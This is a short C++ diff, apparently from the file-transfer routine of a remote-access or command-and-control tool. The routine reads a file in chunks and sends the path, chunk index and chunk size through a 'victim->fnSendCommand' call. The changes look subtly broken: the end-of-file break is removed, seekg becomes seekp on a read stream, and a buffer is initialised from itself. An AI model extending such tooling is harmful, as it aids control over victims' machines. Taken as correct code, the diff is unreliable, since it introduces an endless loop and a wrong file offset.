@@ -253,9 +253,6 @@ public:
         file.read(abBuffer.data(), abBuffer.size());
         std::streamsize nRead = file.gcount();
 
-        if (nRead <= 0)
-            break;
-
         BUFFER abData(abData.begin(), abData.end());
 
         STRLIST ls = {
@@ -292,7 +289,7 @@ public:
         }
 
         int nOffset = nIdx * nChunkSize;
-        file.seekg(nOffset);
+        file.seekp(nOffset);
 
         try
         {
@@ -305,7 +302,7 @@ public:
                 szFilePath,
                 std::to_string(nIdx),
                 std::to_string(nChunkSize),
-            }
+            };
 
             victim->fnSendCommand(ls);
         }
